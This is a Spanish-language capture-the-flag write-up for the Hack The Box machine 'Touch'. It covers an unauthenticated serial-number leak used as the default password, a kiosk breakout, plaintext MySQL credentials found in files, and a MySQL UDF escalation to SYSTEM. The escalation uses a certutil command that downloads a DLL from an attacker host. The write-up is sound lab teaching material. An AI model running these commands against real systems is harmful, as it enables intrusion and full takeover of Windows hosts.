# HTB — Touch Writeup

Oct 29, 2026

## Introducción

Touch es una máquina Windows de dificultad fácil/media en Hack The Box centrada en la explotación de una aplicación web mal asegurada (fuga de credenciales por defecto), el escape de un entorno kiosko restringido, y la escalada de privilegios mediante abuso de funciones definidas por el usuario (UDF) en MySQL.

| Concepto | Valor |
| --- | --- |
| Plataforma | Hack The Box |
| Dificultad | Easy/Medium |
| SO | Windows |
| IP víctima | 10.129.137.202 |
| Técnicas | Default credential disclosure · Kiosk breakout · Source code credential leak · MySQL UDF privesc |

**Ruta general:** Fuga de número de serie vía API sin autenticar → contraseña por defecto en portal DocReader → credenciales de staff (KioskUser) → acceso RDP a kiosko de escaneo de pasaportes → escape del kiosko → credenciales de MySQL en código fuente del backend → credenciales root de MySQL en script de sincronización → RCE como SYSTEM vía UDF (`lib_mysqludf_sys`).

## Fase 1 — Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 -T4 -vvv -oG deep_scan.txt 10.129.137.202
```

| Puerto | Servicio | Detalle |
| --- | --- | --- |
| 135 | MSRPC | Microsoft Windows RPC |
| 3389 | RDP | ms-wbt-server |
| 5985 | WinRM | Microsoft-HTTPAPI/2.0 |
| 8443 | HTTPS | Microsoft-HTTPAPI/2.0 — título "Nexion DeviceHub - Login" |

El servicio del puerto 8443 responde con dos interfaces distintas según la ruta: un panel **Nexion DeviceHub** (login por contraseña de dispositivo) y una pantalla **Nexion DocReader** asociada al mismo DeviceHub (`DH-100 — Gate B7`).

## Fase 2 — Enumeración web

Fuzzing de directorios con `ffuf`, filtrando los 404:

```bash
ffuf -u https://10.129.137.202:8443/FUZZ -w /usr/share/wordlists/dirb/common.txt -k -fc 404
```

Rutas encontradas: `/api`, `/favicon.ico`, `/login`.

```bash
curl -sk http://10.129.137.202:8443/api
# {"error":"Authentication required"}
```

Un fuzzing dirigido dentro de `/api` revela dos endpoints sin autenticación: `/api/scan` y `/api/status`. El primero no devuelve nada útil sin parámetros adicionales; el segundo filtra información del dispositivo:

```bash
curl -sk http://10.129.137.202:8443/api/status
```

```json
{
  "device": "Nexion DeviceHub DH-100",
  "serial": "NX-DH-2024-B7042",
  "firmware": "1.4.2",
  "status": "online",
  "uptime": 70748
}
```

> **Punto clave:** el código fuente de la página de login contiene un tooltip en "Forgot your password?" que indica explícitamente: *"The default password is the device serial number included in your DeviceHub packaging."* El endpoint `/api/status`, accesible sin autenticar, filtra justo ese dato.

## Fase 3 — Acceso inicial

Se usa el número de serie como contraseña por defecto contra el formulario de login de DocReader:

```bash
curl -sk -X POST https://10.129.137.202:8443/login -d "password=NX-DH-2024-B7042"
```

Acceso concedido al panel. Dentro se exponen credenciales de un usuario de staff:

```
Username: KioskUser
Password: K!0sk2026#
```

## Fase 4 — Escape del entorno kiosko

Las credenciales se prueban vía RDP, dando acceso a un terminal en modo kiosko correspondiente a un **equipo de escaneo de pasaportes**:

```bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.137.202 /cert:ignore
```

El entorno está restringido a una única aplicación en pantalla completa: un sistema de reserva/escaneo de pasaportes. Introduciendo los datos de ejemplo proporcionados con la máquina (localizador `KS7X2M`, apellido `Crawford`) se accede a la pantalla de "Scan Passport".

Esa pantalla incluye un control para desactivar el escáner. Al activarlo, la app lanza un error con un **enlace clicable** que apunta a una página de soporte/documentación alojada internamente en el propio equipo Windows. Al abrir ese enlace, se carga una página web dentro de un navegador embebido — la primera vía de escape real del kiosko, porque ya no es la app nativa restringida sino un navegador.

Desde ese navegador, el atajo `Ctrl+O` (Abrir archivo) dispara el diálogo nativo de Windows "Abrir archivo", que es un Explorador completo. Navegando hasta `C:\Windows\System32\cmd.exe` y abriéndolo desde ahí se obtiene una consola `cmd.exe` normal, fuera de cualquier restricción del kiosko.

```cmd
whoami /all
```

El usuario pertenece a un grupo local custom:

```
KIOSK-042\Printer Administrators
```

Este grupo resulta ser un callejón sin salida: el servicio Spooler está parado (`sc query spooler`) y el intento de iniciarlo es denegado. El ACL del servicio (`sc sdshow spooler`) confirma que el grupo no tiene permisos de control sobre él:

```
D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)
```

Solo `Authenticated Users` (consulta), `Builtin Administrators` y `SYSTEM` tienen permisos — PrintNightmare queda descartado por esta vía.

## Fase 5 — Descubrimiento de credenciales

Una enumeración de puertos internos revela servicios que no aparecían en el escaneo externo:

```cmd
netstat -ano | findstr LISTENING
```

```
127.0.0.1:3001   (PID 6096)
127.0.0.1:3306   (PID 4036)  ← MySQL
```

Tras escapar completamente del kiosko (Explorador de archivos funcional), se localiza el código fuente del backend de la aplicación:

```
C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts
```

```typescript
const defaults = {
  host: "127.0.0.1",
  port: 3306,
  user: "kiosk_app",
  password: "K!0sk_R3p1lca#DB",
  database: "htb_airways"
};
```

Con estas credenciales se accede a MySQL y se enumera la base de datos `htb_airways`, que incluye una tabla `_htb_staff` con empleados y códigos de badge (`auth_code`, `badge_number`) — relevante para el endpoint `/login/badge` visto en el JS del login original, aunque no fue necesario explotarlo para la ruta de privesc.

```sql
USE htb_airways;
SHOW TABLES;
SELECT * FROM _htb_staff \G
```

En paralelo, dentro de `C:\ProgramData\HTB Airways\` se encuentra un script de automatización que embebe credenciales de **root** de MySQL en texto plano:

```cmd
type refresh-dates.bat
```

```bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

> **Punto clave:** un script operativo (`refresh-dates.bat`) pensado para mantenimiento automatizado embebe la contraseña de root de la base de datos en texto plano en una carpeta accesible por el usuario kiosko.

## Fase 6 — Escalada de privilegios (RCE vía UDF de MySQL)

Con acceso root a MySQL, se comprueba el privilegio `FILE`:

```sql
SELECT user, host, File_priv FROM mysql.user WHERE user = 'root';
```

```
| root | localhost | Y |
```

Se localiza el directorio de plugins:

```sql
SHOW VARIABLES LIKE 'plugin_dir';
-- C:\MySQL\lib\plugin\
```

Y se confirma que el grupo `Authenticated Users` tiene permiso de escritura (`Modify`) sobre esa carpeta:

```cmd
icacls C:\MySQL\lib\plugin
```

```
NT AUTHORITY\Authenticated Users:(I)(M)
```

Se transfiere la librería UDF precompilada incluida en Metasploit (`lib_mysqludf_sys_64.dll`, en `/usr/share/metasploit-framework/data/exploits/mysql/`) a la carpeta de plugins. Además del SMB server de Impacket, es viable transferirla con un LOLBIN nativo de Windows (`certutil.exe`), útil cuando no se dispone de acceso al Explorador gráfico y solo hay una `cmd`/PowerShell:

```cmd
certutil.exe -urlcache -split http://<IP_KALI>/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

Con la DLL ya en `plugin_dir`, se registra la función como extensión de MySQL:

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
```

Prueba de ejecución de comandos arbitraria:

```sql
SELECT CONVERT(sys_eval('whoami') USING utf8);
-- nt authority\system
```

El servicio de MySQL corre como `LocalSystem`, por lo que la función `sys_eval` da **ejecución de comandos como SYSTEM**.

> **Nota:** el cliente `mysql.exe` devuelve el resultado de `sys_eval` en hexadecimal cuando la salida no se fuerza a texto. `CONVERT(... USING utf8)` lo resuelve directamente en la propia consulta; como alternativa manual, el hex se puede pegar en [CyberChef](https://gchq.github.io/CyberChef/) (receta "From Hex") para decodificarlo a ASCII.

### Flag de root

```sql
SELECT CONVERT(sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt') USING utf8);
```

> **Por qué funciona:** MySQL permite registrar funciones nativas (UDF) desde una DLL ubicada en `plugin_dir` siempre que el usuario tenga privilegio `FILE` para escribir ahí (directo o, como en este caso, por una ACL de carpeta demasiado permisiva) y pueda ejecutar `CREATE FUNCTION`. Dado que el servicio MySQL corre como `LocalSystem`, cualquier función UDF cargada hereda ese nivel de privilegio, convirtiendo una simple escritura de archivo en ejecución de código como SYSTEM.
